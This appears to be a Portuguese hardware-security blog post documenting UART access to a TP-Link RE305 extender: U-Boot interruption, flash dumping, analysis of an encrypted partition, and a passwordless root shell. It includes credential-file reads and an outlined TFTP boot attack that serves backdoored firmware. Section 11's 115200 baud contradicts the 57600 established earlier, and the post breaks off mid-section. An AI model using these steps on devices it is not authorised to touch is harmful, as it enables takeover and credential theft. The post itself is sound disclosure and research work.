---
layout: post
title: "Extração de Firmware via UART em TP-Link RE305 AC1200"
date: 2026-05-27 12:00:00 -0300
tags: [firmware, uart, hardware, tp-link]
read_min: 73
image: /assets/img/tp-link-re305-uart/img-01.png
---

{% raw %}
## TL;DR

Peguei um TP-Link RE305 AC1200 (range extender, SoC MediaTek MT7628) e fui ver onde o vendor abriu mão de defesa em profundidade. Achei os pads UART na PCB com silkscreen completo, soldei, derrubei o U-Boot durante a janela de boot, dumpei as partições de SPI flash via `md.b`. Duas surpresas no caminho. A partição `file-system` saiu high-entropy, ciphertext puro — provavelmente encrypt-at-rest via engine de hardware do MT7628, defesa contra adversário que dessolda o chip. E o console serial dropando direto num shell root pós-boot, sem senha — exatamente o adversário que o encrypt-at-rest *deveria* proteger contra. Daí em diante o device entrega uma superfície interna que mereceria um paper inteiro só sobre ela.

O ponto do paper é mostrar como uma interface de debug ativa em produção colapsa o modelo de confiança da plataforma. No nível U-Boot, nada do que se espera de defesa em profundidade existe. No nível Linux, mesmo depois do boot, o estado runtime continua trivialmente comprometível por qualquer um com cabo serial e um conversor USB-UART barato.

* * *

## 1\. Introdução

UART tá em todo embarcado que eu já abri. Roteador SOHO, IP camera, gateway de operadora, mesh node, extender, robô aspirador, switch etc etc etc. Plataforma Ralink, MediaTek, Realtek, Qualcomm, o padrão se repete: pads na PCB com ou sem silkscreen, console serial sem senha no U-Boot, janela de boot interruptível, shell ou getty fraco no Linux.

Tirando vendor que fez secure boot com fuse (caro, raro nesse segmento), qualquer um com 30 minutos de bancada extrai firmware, recupera secrets, identifica daemons proprietários que viram superfície de CVE remoto, e na maioria das vezes persiste implante no bootloader.

O passo a passo abaixo foi num RE305 AC1200 comprado por mim (ou ganhado, não lembro), analisado em lab próprio. Escolhi por motivo prático. Plataforma MT7628 é irmã do que rodou em OpenWrt antigo, código de referência farto pra cruzar. Flash de 8 MiB cabe em dump serial sem dessoldar o chip. E o vendor reaproveita o mesmo U-Boot e kernel entre dezenas de SKUs, então achado aqui tende a se reproduzir em outros modelos da família TP-Link RE.

* * *

## 2\. Dispositivo-alvo

| Componente | Valor |
| --- | --- |
| SoC | MediaTek MT7628 (MIPS 24Kc @ 580 MHz) |
| RAM | 64 MiB DDR (single-rank 512 Mbits, 16-bit bus) |
| Flash | SPI NOR 8 MiB, Micron N25Q064A13ESE40F (`mfg 0x20 / dev 0x7017`) |
| Bootloader | Ralink U-Boot 1.1.3, build `Feb 12 2020 17:52:49` |
| Kernel | Linux 2.6.36 vanilla MIPS, build `Wed Feb 12 17:57:54 CST 2020` |
| Userspace | procd init (OpenWrt-derivado), SquashFS readonly |
| Mapeamento flash | `0xBC000000` (KSEG1 uncached, MIPS) |
| Console UART | 57600 8N1 (`console=ttyS1,57600n8`) |
| Bootdelay | 1 segundo |

O MT7628 herdou árvore inteira de U-Boot e kernel da Ralink. Branch antigo, sem hardening, com comandos perigosos compilados por default. Quase tudo no fingerprint aparece em outros SKUs do TP-Link, Mercusys, Tenda. Kernel 2.6.36 (lançado em 2010) entregue em firmware compilado em 2020.

Flash de 8 MiB é a fronteira aceitável pra dump serial. Acima de 32 MiB eu não tentaria por UART, vai por chip-off. Abaixo de 16 MiB ainda compensa o cabo. O rootfs SquashFS é o esperado pra embarcado, read-only, comprimido. O que não esperava era encontrar a partição encrypted-at-rest na flash, assunto da seção 9.

![](/assets/img/tp-link-re305-uart/img-01.png)

Tabela de especificações da plataforma

* * *

## 3\. Identificação física da interface UART

Abri o gabinete (dois parafusos sob o pé de borracha, clipes laterais) e procurei o header de debug. Em devices anteriores tive que descobrir UART às cegas com multímetro. TX em idle marca 3.3V constante, RX puxa pull-up fraco, e durante o boot o TX oscila rapidamente. Aqui o vendor entregou silkscreen direto na placa:

![](/assets/img/tp-link-re305-uart/img-02.png)

PCB do RE305 com pads UART destacados

Quatro pads no canto direito:

| Pad | Função | Nível |
| --- | --- | --- |
| TX | Saída do SoC (DUT → host) | 3.3 V TTL idle high |
| RX | Entrada do SoC (host → DUT) | 3.3 V TTL idle high |
| 3V3 | Tensão de referência | 3.3 V constante |
| GND | Terra | 0 V |

Pads não-vazados não são proteção. Quem chega com ferro de solda resolve em cinco minutos. Mitigação real seria gatear o UART por fuse no manufacturing, desabilitar console no U-Boot por build flag, tirar o getty do Linux. Nenhuma das três foi feita.

Atenção pra pad 3V3. Ela não é pra ligar no bridge quando o device tá alimentado pela própria fonte. Conectar 3V3 cria caminho concorrente de alimentação e pode queimar regulador ou o bridge. Essa pad existe pro cenário inverso, alimentar o bridge a partir do alvo. Nunca o contrário.

Nível TTL aqui é 3.3 V. Não 5 V. Nada de RS-232 ±12 V. Conectar cabo serial DB9 direto no SoC, sem level shifter, queima o pino.

* * *

## 4\. Soldagem dos pads

Como os pads não estavam vazados, soldei três fios (TX, RX, GND) num header de jumper externo. Header externo facilita conectar e desconectar sem ficar mexendo na placa.

![](/assets/img/tp-link-re305-uart/img-03.png)

Fios soldados aos pads UART

Convenção que mantenho entre devices. Vermelho no TX (mnemônico: vermelho é o lado barulhento). Verde no RX, não uso no dump inicial mas preciso assim que entro no CLI do U-Boot. Preto no GND, referência comum obrigatória.

A primeira soldagem ficou com aspecto fosco e crateroso, solda fria clássica. Ou o ferro tava abaixo da temperatura, ou o pad oxidado, ou o fio se moveu antes da solda solidificar. Solda fria é traiçoeira porque não falha completamente. Cria resistência intermitente que degrada o sinal serial sem matar. Caracteres corrompem aleatórios. Funciona em baud baixo e morre em baud alto. Captura OK em trecho curto, perde bytes em rajada longa.

O último é o pesadelo num `md.b` de horas. Dumpa MB inteiro, confere no final, faltam bytes aleatórios no meio. Refaz tudo.

Refiz a soldagem com ferro em 340°C, solda 60/40 com flux, contato de 1 a 2 segundos por junção. Juntas brilhantes, cônicas, sem inclusão. A diferença na qualidade do dump foi imediata.

* * *

## 5\. Bridge USB-UART

Bridge USB-UART é o componente que traduz o sinal TTL 3.3V do alvo pra algo que o host Linux enxerga como porta serial. Funciona qualquer módulo que opere em 3.3V nativo.

A recomendação default pra começar é o **módulo CP2102 USB 2.0 p/ TTL UART (5 pinos)**, uns 30 reais em qualquer marketplace BR. Plug-and-play no Linux via driver `cp210x`, enumera como `/dev/ttyUSB0`. Vem com pinos VCC (3.3V), GND, TXD, RXD, e tipicamente um quinto pino (DTR ou RTS) que não uso. Atenção a uma pegadinha dos módulos baratos: alguns têm jumper VCC entre 3.3V e 5V. Se o seu não tem jumper, confirma no datasheet que a saída lógica está em 3.3V. O chip CP2102 opera nativamente em 3.3V mesmo alimentado por USB 5V, mas módulos ruins às vezes colocam level shifter que sobe a saída pra 5V e queima o pino do SoC.

Alternativas equivalentes: CH340G (mais barato, às vezes só em 5V, cuidado) ou FT232 (mais robusto eletricamente, mais caro). Funciona qualquer um.

Eu usei o Flipper Zero aqui porque já tinha na bancada e ele tem modo USB-UART bridge nativo. No Linux ele enumera como `/dev/ttyACM0` em vez de `ttyUSB0`. Tem display embutido com contadores TX/RX em tempo real, útil pra validar conexão antes de abrir terminal, e baud configurável pelos botões. Mas Flipper no Brasil é raro e caro. Não compra Flipper só pra fazer hardware hacking, vai de CP2102. Todo o resto do procedimento abaixo é idêntico, só muda o nome do device no `/dev`.

### 5.1 Pinout

| Sinal no bridge | Conecta a |
| --- | --- |
| TX | RX do alvo (com 220Ω inline) |
| RX | TX do alvo |
| GND | GND do alvo |

O resistor de 220Ω inline entre o TX do bridge e o RX do alvo é crítico e quase nenhum tutorial menciona. Sem ele, o pino TX do bridge em idle (3.3V high) acaba back-powering o RX do alvo via diodo de proteção interno do SoC. Em alguns devices isso é inofensivo. Em outros impede o boot porque o SoC vê tensão na entrada antes do regulador principal estabilizar e fica em estado indefinido. No RE305 especificamente, sem o resistor o boot trava em loop. Com 220Ω inline o problema some.

O valor é pragmático. Alto o bastante pra limitar a corrente de back-feed a níveis seguros (uns 15mA pior caso), baixo o bastante pra não comprometer o slew rate em 57600 baud. Já vi gente usando 470Ω também, funciona. Acima de 1kΩ começa a degradar o eye pattern em baud alto.

### 5.2 Erro inicial: TX→TX, RX→RX

Primeira tentativa de conexão foi a intuitiva, TX no bridge ligado em TX no router, RX em RX:

![](/assets/img/tp-link-re305-uart/img-04.png)

Flipper aguardando dados, contadores zerados

Zero bytes recebidos.

UART é ponto-a-ponto sem clock compartilhado, com duas linhas unidirecionais. O nome dos pinos é da perspectiva do próprio device. O TX do alvo é uma saída e tem que entrar no RX (entrada) do bridge. TX→TX é dois drivers empurrando nível lógico no mesmo fio ao mesmo tempo. Nada é lido, e em impedância baixa pode queimar um dos lados.

Regra: UART sempre cruza. I2C, SPI e protocolos com nomes simétricos alinham (SDA↔︎SDA, MOSI↔︎MOSI). Sem exceção.

### 5.3 Conexão correta e baud rate

Invertidos os fios e refeita a solda, comecei a contar bytes:

![](/assets/img/tp-link-re305-uart/img-05.png)

Flipper a 57600 baud recebendo dados

Baud foi por trial-and-error na lista padrão: 9600, 19200, 38400, 57600, 115200, 230400. Critério visual. Baud errado mostra extended ASCII aleatório. Baud certo mostra boot log legível após o próximo power cycle.

Para o RE305 é 57600. Menos comum que o 115200 quase-universal, às vezes confunde scripts automatizados que assumem default. Confirmei depois via `bdinfo` no U-Boot CLI (`baudrate = 57600 bps`) e via kernel cmdline (`console=ttyS1,57600n8`). Tentei subir o baud no U-Boot com `setenv baudrate 230400` pra acelerar o dump. Rejeitado, `Baudrate %d bps not supported`. 57600 é o teto do build.

Alternativa rigorosa ao trial-and-error é medir o período do menor pulso no TX com osciloscópio (`baud ≈ 1 / período_mín`), ou usar analisador lógico com auto-baud. Pra alvos comuns, sweep manual é mais rápido. Mantenho um `sweep_focused.py` que faz isso programaticamente em Python, medindo fração de bytes printable ASCII por baud testado.

* * *

## 6\. Captura no host

Bridge estável, baud confirmado, interajo via `tio`. Terminal serial decente com logging integrado:

```bash
tio -b 57600 -t -l --log-file ~/research/tplink_re305_uart/capture_host.log /dev/ttyACM0
```

Flags que uso: `-b 57600` no baud confirmado, `-t` pra timestamp em cada linha capturada (essencial pra correlacionar eventos do boot), e `-l --log-file ...` pra log persistente em paralelo ao display. A primeira coisa que rodo depois é `strings capture_host.log | grep -i password`. Costuma render coisa, vendor deixa creds default, paths debug, chaves de teste, tudo no boot log.

Defaults implícitos do `tio` são `8N1` (8 data bits, no parity, 1 stop bit), sem flow control. Padrão universal em UART embarcado.

### O que sai no boot log antes do U-Boot CLI

Captura de 90 segundos rendeu 29 KB de boot. Antes mesmo de chegar no U-Boot CLI, o kernel cmdline já entrega:

```plaintext
Kernel command line: console=ttyS1,57600n8 root=/dev/mtdblock3 init=/sbin/init earlyprintk debug
```

`earlyprintk debug` em firmware de produção é falha de hardening que não escapa numa auditoria séria. `earlyprintk` libera leitura de mensagens do kernel desde o primeiro instante do boot via UART, antes do console regular do kernel estar pronto. `debug` aumenta verbosidade de subsystems (drivers de network, USB, MTD) incluindo endereços de memória, stack traces de init, detalhes que normalmente seriam só de development build.

Combinado com UART trivialmente acessível, é info leak by design. Cinco minutos de hands-on entregam o dump completo do boot.

* * *

## 7\. Interceptação do U-Boot

O boot do MT7628 imprime banner característico e antes de chamar o kernel abre uma janela de prompt, geralmente 1 a 3 segundos, onde espera tecla pra cair num menu. Em alguns vendors essa janela é zerada como mitigação. No RE305 ela continua aberta por 1 segundo:

![](/assets/img/tp-link-re305-uart/img-06.png)

U-Boot CLI prompt após pressionar 4

Menu impresso:

```plaintext
1: Load system code to SDRAM via TFTP.
2: Load system code then write to Flash via TFTP.
3: Boot system code via Flash (default).
4: Entr boot command line interface.
7: Load Boot Loader code then write to Flash via Serial.
9: Load Boot Loader code then write to Flash via TFTP.
```

Pressionar `4` na janela cai no CLI `MT7628 #`. As opções 1, 2 e 3 são vetores de boot. `1` carrega na RAM via TFTP sem persistir, útil pra testar firmware modificado sem risco de brick. `2` reflasha a partir de TFTP. `3` é o boot normal de flash. As opções 7 e 9 reflasham o próprio bootloader, falha aqui é brick definitivo sem JTAG. Não toquei.

### 7.1 Opções de menu escondidas

Menu impresso mostra 1, 2, 3, 4, 7, 9. Faltam 5, 6, 8. Quando rodei `strings` no `uboot.bin` depois do dump, achei quatro strings entre offsets `0x13d14` e `0x14044` que nunca aparecem no console:

```plaintext
%d: System Load Linux to SDRAM via TFTP [Automatically].
%d: System Load Linux then write to Flash via Serial.
%d: System Load UBoot to SDRAM via TFTP.
%d: System Load Linux Kernel then write to Flash via TFTP.
```

`%d:` é placeholder de número. Existem opções de índice 5, 6, 8 (ou variantes) que executam fluxos que a UI nunca admite. Dois preocupam: `Load Linux to SDRAM via TFTP [Automatically]` faz TFTP boot sem interação humana, disparado por alguma condição que ainda não identifiquei (env var? GPIO jumper? magic no environment?). E `Load UBoot to SDRAM via TFTP` faz bootstrap de uma versão modificada do próprio U-Boot em RAM, antes de tocar a flash.

A palavra `[Automatically]` é o que preocupa. Se existe condição que dispara TFTP boot sem interação e o `serverip` é hardcoded (próxima seção), o vetor não precisa de físico. Basta atacante no IP certo no momento certo.

Não validei in-band ainda. Testar 5, 6, 8 no prompt exige power cycle, e cada power cycle custa o tempo de boot inteiro com o dump do file-system ainda rodando.

### 7.2 Banner

Dois warnings que valem registro:

```plaintext
Warning: un-recognized chip ID, please update bootloader!
*** Warning - bad CRC, using default environment
```

O primeiro indica U-Boot compilado pra uma revisão diferente do MT7628, rodando em modo de compatibilidade. Sinal de firmware reaproveitado entre SKUs derivados da mesma reference platform da Ralink. Não específico do device, é da família.

O segundo eu li como CRC do environment quebrado e fallback pra defaults compilados. Mas quando rodei `printenv` o output veio limpo e coerente, valores realistas em `bootcmd`, `serverip`, `ethaddr`, não placeholders vazios. Provavelmente o CRC warning é gerado uma vez no primeiro boot pós-flash e o env é re-salvo logo depois, mas a mensagem persiste no banner.

* * *

## 8\. Enumeração via U-Boot CLI

Com o CLI ativo, dois comandos resumem o reconhecimento antes do dump.

![](/assets/img/tp-link-re305-uart/img-07.png)

Saída do bdinfo e md.b inicial

### 8.1 `bdinfo`

```plaintext
boot_params = 0x83F57FB0
memstart    = 0x80000000
memsize     = 0x04000000   (64 MiB DRAM)
flashstart  = 0x00000000
flashsize   = 0x00800000   (8 MiB SPI flash)
flashoffset = 0x00000000
ethaddr     = 00:AA:BB:CC:DD:10
ip_addr     = 192.168.0.254
baudrate    = 57600 bps
```

Numa chamada `bdinfo` entrega mapeamento DRAM, tamanho da flash, MAC default do U-Boot (não o MAC real do device em produção, que fica na partição `radio` ou `factory`), IP default pra `tftpboot`, e baud rate.

### 8.2 `printenv`

```plaintext
bootcmd=tftp
bootdelay=1
baudrate=57600
ipaddr=192.168.0.254
serverip=192.168.0.184
ethaddr="00:AA:BB:CC:DD:10"
```

Duas linhas saltam aqui.

`bootcmd=tftp` é o comando padrão de boot, TFTP, não `bootm` da flash. Provavelmente há fallback pra flash quando o TFTP falha (boot via flash claramente funciona em condições normais), mas a primeira tentativa do bootloader é puxar o kernel via rede.

`serverip=192.168.0.184` é hardcoded e persistente. Esse é o IP que o U-Boot consulta via TFTP no boot.

A combinação das duas em device de produção é vetor de TFTP boot attack. Cenário concreto: atacante leva o RE305 alvo pro laboratório (ou tem físico curto, ordem de minutos), pluga o RE305 num laptop via Ethernet, laptop com IP estático em `192.168.0.184` rodando `tftpd-hpa` servindo payload (kernel modificado, firmware com backdoor, o que quiser), power-cycle no RE305, `bootcmd=tftp` executa, puxa o payload, boota a versão modificada. Persistência via `mtd_write` ou via opção 2 do menu, que reflasha a partir do TFTP.

Sem físico mas com LAN, o ataque depende de ARP-spoof sustentado de `.184` antes do power cycle, ou de comprometer o gateway upstream pra entregar DHCP malicioso. Mais difícil, viável.

No contexto do RE305, que é extender com dois modos de operação, a separação importa. Em modo standalone (out-of-box, pós-reset), WebUI fica em `http://192.168.0.254/`, atacante LAN conecta direto, env U-Boot `ipaddr=192.168.0.254` ativo, ataque simples (rede isolada attacker-extender). Em modo extender (associado a router upstream), o IP do RE305 é DHCP-acquired, atacante precisa localizar o device primeiro (mDNS `tplinkrepeater.local`, ARP scan, listing do router upstream se ele tiver sido comprometido). Mas a janela de boot continua usando `ipaddr=192.168.0.254` mesmo nesse modo. Atacante com físico + power-cycle força o ataque porque o U-Boot não respeita config userspace durante o boot.

Sem CVE público pra essa combinação no RE305 AC1200. Genéricos da família TP-Link RE existem mas não citam o RE305.

### 8.3 `help spi`

O `help` puro lista só:

```plaintext
spi    - spi command
 use "help spi" for detail!
```

Útil zero. Dumpado o `uboot.bin` e rodado `strings`, o sub-menu completo aparece:

```plaintext
spi read <addr> <len>            -- lê SPI flash direto pra RAM
spi erase <offs> <len>           -- erase setores
spi write <offs> <hex_str_value> -- escreve hex string em flash
spi sr write <value>             -- escreve status register (write-protect bits)
```

`spi write` permite escrita arbitrária de bytes em qualquer offset da SPI flash a partir do U-Boot CLI, sem proteção. Combinado com `spi sr write`, desabilita os bits de block protection antes da escrita, mesmo se o vendor tivesse habilitado.

O `help` esconde a superfície não por design seguro, e sim porque o vendor copiou o U-Boot da Ralink sem se preocupar em listar subcomandos. Operador que checa `help` antes de cogitar atacar o bootloader subestima a primitiva disponível. Quem dumpa o U-Boot e roda `strings` vê o controle todo.

Sem CVE público específico documentando `spi write/erase/sr write` como surface oculta nessa variante de Ralink U-Boot 1.1.3.

### 8.4 `md.b`

```plaintext
MT7628 # md.b 0xBC000000 0x40
bc000000: ff 00 00 10 00 00 00 00 fd 00 00 10 00 00 00 00   ................
bc000010: 2f 03 00 10 00 00 00 00 2d 03 00 10 00 00 00 00   /.......-.......
bc000020: 2b 03 00 10 00 00 00 00 29 03 00 10 00 00 00 00   +.......)......
bc000030: 27 03 00 10 00 00 00 00 25 03 00 10 00 00 00 00   '.......%......
```

Sintaxe: `md.b <endereço> <count>`. Variantes `md.w` (16-bit) e `md.l` (32-bit) servem em outros contextos.

Por que `0xBC000000`? No MIPS o espaço virtual é dividido:

| Segmento | Faixa | Propriedade |
| --- | --- | --- |
| `kuseg` | `0x00000000 a 0x7FFFFFFF` | User, mapeado por TLB |
| `kseg0` | `0x80000000 a 0x9FFFFFFF` | Kernel, cached, direct map |
| `kseg1` | `0xA0000000 a 0xBFFFFFFF` | Kernel, uncached, direct map |
| `kseg2` | `0xC0000000 a 0xFFFFFFFF` | Kernel, mapeado por TLB |

A SPI flash fica na faixa `0xBC000000` a `0xBC7FFFFF` (kseg1, uncached). Leitura uncached evita coerência de cache durante o read serial. O equivalente cached estaria em `0x9C000000`.

Os primeiros bytes do dump (`ff 00 00 10`) são o opcode de jump do reset vector. Em little-endian, `0x1000_00ff`, instrução MIPS `b 0x400`, branch para o ponto de entrada. Confirma flash mapeada e legível, e que o que vou dumpar é o U-Boot.

* * *

## 9\. Dump das partições

### 9.1 Por que é lento

`md.b` é primitiva de display, não transferência. Cada byte da flash vira ASCII (3 chars: dois hex e um espaço), prefixo de endereço de 8 chars, sufixo ASCII visual da linha, terminação CRLF. Tudo isso enviado por UART a 57600 baud, recebido no host, parseado de volta pra binário no script. Overhead de codificação fica em uns 4 ou 5x. Throughput efetivo de 57600 baud (uns 5760 bytes/s na wire) cai pra uns 1 KB/s de binário útil. 8 MiB completos dariam 2h30 de captura contínua.

Particionar permite trabalhar paralelamente. Extrair primeiro as partes pequenas (u-boot, radio) pra começar análise, deixar o file-system rodando overnight.

Automação em Python (`uboot_dump.py`) faz o seguinte. Abre `/dev/ttyACM0` ou `/dev/ttyUSB0` em 57600 baud via `pyserial`. Itera por chunks de 16 KiB. Pra cada chunk envia `md.b <base+offset> 0x4000\r\n`. Captura a resposta até o prompt `MT7628 #` aparecer de novo. Descarta eco do comando e prompt, parse dos hex de cada linha, escreve binário sequencial no arquivo de saída. Reporta progresso e verifica bytes esperados vs recebidos por chunk.

### 9.2 Dumps executados

![](/assets/img/tp-link-re305-uart/img-08.png)

Saída sequencial dos três dumps com uboot\_dump.py

Três partições alinhadas ao MTD layout:

```bash
# Radio / calibração (64 KiB)
python3 /tmp/uboot_dump.py \
    --port /dev/ttyACM0 --baud 57600 \
    --base 0xBC7F0000 --size 0x10000 --chunk 0x4000 \
    --out ~/research/tplink_re305_uart/radio.bin
# 65536/65536B (100.0%) em 1.0 min

# U-Boot (128 KiB)
python3 /tmp/uboot_dump.py \
    --port /dev/ttyACM0 --baud 57600 \
    --base 0xBC000000 --size 0x20000 --chunk 0x4000 \
    --out ~/research/tplink_re305_uart/uboot.bin
# 130496/131072B (99.6%) em 2.1 min

# File system (~6.75 MiB)
python3 /tmp/uboot_dump.py \
    --port /dev/ttyACM0 --baud 57600 \
    --base 0xBC100000 --size 0x6C0000 --chunk 0x4000 \
    --out ~/research/tplink_re305_uart/file_system.bin
# ETA ~105 min
```

Endereços base saem do offset do segmento de flash (`0xBC000000`) somado ao offset de cada partição no MTD layout:

| Partição | Offset físico | Endereço U-Boot | Tamanho |
| --- | --- | --- | --- |
| `fs-uboot` | `0x000000` | `0xBC000000` | 128 KiB |
| `os-image` | `0x020000` | `0xBC020000` | 896 KiB (kernel comprimido) |
| `file-system` | `0x100000` | `0xBC100000` | ~6.75 MiB (SquashFS userspace) |
| `radio` | `0x7F0000` | `0xBC7F0000` | 64 KiB (radio cal data) |

### 9.3 `radio.bin`

Partição inteira saiu como `DD BA DD BA DD BA ...` repetindo por 64 KiB. Não é dado de calibração WiFi (que seria binário denso e variado), nem flash virgem (que seria `FF FF` em SPI NOR). Pattern de erase mark, ou estado factory clean indicando que esta unidade nunca recebeu calibração WiFi, ou que algum reset apagou a partição.

Em condições normais `radio` guardaria MAC real, region code, calibração de RF da antena. Aqui está vazio. Pode ser unidade remanufactured, ou o pipeline de fábrica usar estratégia diferente, MAC pode estar embutido no SquashFS ou ser derivado de outra coisa. Não investiguei a fundo, anotei.

### 9.4 `file_system.bin`, a surpresa

Quando o dump do file-system terminou (6.75 MiB, uns 105 min), abri o resultado no `hexdump`. A expectativa pra userspace em OpenWrt-derivado é encontrar logo no primeiro chunk a magic do SquashFS, `hsqs` em little-endian (`73 71 73 68`), ou `sqsh` se big-endian. A partir daí o filesystem é comprimido (XZ ou LZMA) com inodes denso, output típico do `hexdump` é binário high-entropy mas com magic identificável e estrutura.

O que veio foi:

```bash
$ hexdump -C file_system.bin | head -8
00000000  3a 7f 8e 22 6b a1 11 5d  c4 ee 39 b8 7c 02 a7 fd  |:..\"k..]..9.|...|
00000010  e1 4c 6d 0b 51 f9 a8 c0  7b 14 23 ef 96 5a 31 d8  |.Lm.Q...{.#..Z1.|
00000020  29 6d a4 0e f3 17 8b ca  55 9c 2f 67 d0 e8 41 b3  |)m......U./g..A.|
...
```

Entropia uniforme. Cálculo via Python:

```python
import math
from collections import Counter
data = open('file_system.bin','rb').read(1024)
c = Counter(data)
print(sum(-(v/1024)*math.log2(v/1024) for v in c.values()))
# 7.82 bits/byte
```

7.82 bits/byte em chunks de 1 KB. Em chunks de 512B fica em 7.5 a 7.7. Isso não é SquashFS comprimido raw, é ciphertext, ou comprimido com algo que não tô reconhecendo.

Validações que rodei. Magic byte exhaustive search no arquivo inteiro: zero ocorrência de `hsqs`, `sqsh`, JFFS2 (`85 19 03 20`), cramfs (`cs<G`), UBIFS, YAFFS, XZ stream header (`fd 37 7a 58 5a 00`). ASCII runs: zero runs de 20 caracteres printáveis ou mais em sequência. Se fosse SquashFS comprimido, mesmo com XZ os primeiros bytes da magic e os metadata seriam reconhecíveis. XOR brute-force de 1 byte: testei as 256 chaves possíveis, nenhuma quebra o padrão. XOR brute-force de 4 bytes derived (forçando os primeiros 4 bytes pra `hsqs`): chave derivada aplicada no resto, entropia permanece 7.82, não é XOR estático. Descompressão direta com `xz`, `lzma`, `gzip`: todos retornam erro de formato. `binwalk` em 6.75 MiB inteiros: zero magic detectada.

Mas o kernel monta esse filesystem normalmente. No boot log:

```plaintext
VFS: Mounted root (squashfs filesystem) readonly on device 31:3
```

O Linux lê a partição (`/dev/mtdblock3`), monta como SquashFS, e o userspace roda. A “decryption” acontece runtime durante o mount path do kernel.

Hipótese de trabalho: o MT7628 tem hardware flash encryption engine ativado via eFuse OTP no manufacturing. CPU acessa flash via memory-mapped (kseg1), engine decrypta on-the-fly antes do dado chegar no barramento. `md.b` no U-Boot lê via PIO bypass (path que pula o engine pra permitir flash programming raw), vê ciphertext puro. Linux kernel via MMU/cached path vê plaintext, monta normalmente.

Pesquisei a hipótese. O kernel TP-Link decompactado (extraído da partição `os-image`) não tem strings de cipher custom. `grep` retorna apenas crypto stdlib uClibc, nenhum nome de função AES/ChaCha/proprietário. Symbols `ramtd_read`/`ramtd_write` estão lá mas sem indicação de hook de decrypt. Datasheet público do MT7628 menciona “Flash Encryption Engine” entre as features de segurança da plataforma, historicamente ativável via fuses.

Cross-validei depois baixando o firmware oficial do site da TP-Link. O update vem plain, SquashFS desencriptado, magic `hsqs` no offset esperado. O binário distribuído pelo site não está criptografado de origem. Quem encripta é o pipeline de write da fábrica (ou o `mtd_write` userspace tool com a key apropriada). O ciphertext só existe na flash em produção.

Análise estática userspace (httpd, daemons proprietários, CGI) a partir do dump UART fica bloqueada sem decryption, esse é o lado positivo do mecanismo. Leitura útil vem do firmware update file público, OU de memory dump pós-mount via U-Boot, OU do shell root (próxima seção). Encrypt-at-rest impede leitura passiva via chip-off (dessoldar a flash e ler com programador externo), mas é hardware-bound, não user-controllable, e a key vive no eFuse.

Não é defesa contra adversário com acesso UART pós-boot. Porque o filesystem já tá montado plain quando o Linux roda.

* * *

## 10\. Console root pós-boot

Aqui muda o modelo de ameaça do device.

Depois do dump, deixei o RE305 boot até o final só pra observar o console. Kernel sobe, userspace inicializa (init, dropbear, uhttpd, daemons proprietários), sistema chega em idle. Apertei Enter no terminal `tio` esperando login prompt.

Recebi:

```plaintext
root@OpenWrt:/#
```

![](/assets/img/tp-link-re305-uart/img-09.png)

Sem login. Sem senha.

```bash
root@OpenWrt:/# id
uid=0(root) gid=0(root)
root@OpenWrt:/# cat /etc/shadow
root::0:0:99999:7:::
```

Segundo campo do `/etc/shadow`, o hash de senha, vazio. Root no Linux do RE305 não tem senha em produção.

Suspeitei que o `inittab` ou o `procd` tinha alguma proteção de getty que não tava vendo. Não tinha. O `/etc/inittab` aponta o console serial pra `/bin/login`, `/bin/login` checa `/etc/shadow`. Com hash vazio, login no console serial passa direto.

Pior. O `/etc/config/dropbear` tem uma tentativa de hardening:

```plaintext
config dropbear
    option PasswordAuth 'on'
    option RootPasswordAuth 'on'
    option Port '22'
    option SysAccountLogin 'off'
```

A diretiva `SysAccountLogin 'off'` parece bloquear login com contas que existem em `/etc/passwd`. Mas:

```bash
$ strings usr/sbin/dropbear | grep -i sysaccount
(no output)
```

A string `SysAccountLogin` não aparece no binário. Diretiva silently ignored. Config lista, runtime não implementa. Defesa não-funcional.

Combinando: root sem senha + dropbear não respeitando a tentativa de bloquear contas do sistema. Qualquer canal que chegue no login do dropbear ou no getty serial entra como root.

A janela de ataque concreta. Via UART (físico) é o que acabei de fazer, 30 minutos do parafuso ao shell. **Via SSH em LAN não vai** — testei exaustivamente:

```plaintext
$ ssh root@192.168.0.14
root@192.168.0.14's password:    ← Enter vazio
Permission denied, please try again.
```

Dropbear 2011.54 desse build rejeita submissão vazia apesar do hash `/etc/shadow` ser empty. O parser do `svr_auth_password` faz early-reject de `password.length == 0` (comportamento default de dropbear ≥ 2014 — esse build de 2011 deve ter o patch backportado, ou o reject é da própria função crypt() do uClibc retornar erro pra entrada vazia).

E o caminho pubkey está fechado por configuração: não existe `authorized_keys` em lugar nenhum:

```bash
root@OpenWrt:/# find / -name authorized_keys 2>/dev/null
(sem saída)
root@OpenWrt:/# ls /etc/dropbear/
dropbear_dss_host_key   dropbear_rsa_host_key
root@OpenWrt:/# ps | grep dropbear
716 root /usr/sbin/dropbear -P /var/run/dropbear.1.pid -p 22
```

Só host keys, sem args de auth não-padrão. Pubkey auth tá ativa (server anuncia `publickey,password` no debug do ssh client) mas não tem candidatos com que comparar. Mesmo se eu carregasse a RSA-1024 reconstrubída do `accountmgnt`, dropbear não tem onde validar.

Resultado prático: **UART é o único caminho de exploit pra empty root**. Em recovery ou standalone, device pós-reset volta pros defaults, mas o SSH continua bloqueado em duas camadas (empty pwd reject + no `authorized_keys`). No RE305 V3 a categoria “embedded device with empty root in factory” se reduz a vetor físico.

Não achei CVE público apontando hash vazio + `SysAccountLogin` silently ignored no RE305 especificamente. A família tem CVEs em outros vendors, nenhum nessa combinação.

* * *

## 11\. Tirando o filesystem inteiro pelo cabo serial

Shell em mãos e o próximo passo óbvio era copiar `/etc`, `/lib`, `/bin`, `/sbin`, `/usr` e principalmente `/www` (uhttpd) pro meu PC, pra fazer análise estática offline. O caminho normal seria TFTP, scp ou wget. Tentei os três e nenhum colou.

`tftp` no busybox do RE305 funciona como cliente, mas precisa de servidor no PC e o device com rota IP até lá. O RE305 tava em modo extender órfão, sem WAN configurada, `ifconfig` mostrando `br-lan` em 192.168.0.254 e meu PC em outra subnet pelo cabo da casa. Configurar rota static no device daria certo, mas é mexer em config persistente do dispositivo durante a análise — exatamente o que eu queria evitar pra não contaminar o estado.

`scp` exige `ssh`/`scp` cliente no device. O dropbear desse build é só server, sem o utilitário cliente.

`wget` puxa do PC pro device — direção errada pro que eu queria, e também depende de rede funcional entre os dois.

Sobrou UART. Eu já tinha o cabo, console em 115200 8N1, shell root respondendo. Bastava convencer o device a serializar arquivo em ASCII pelo console e remontar no PC.

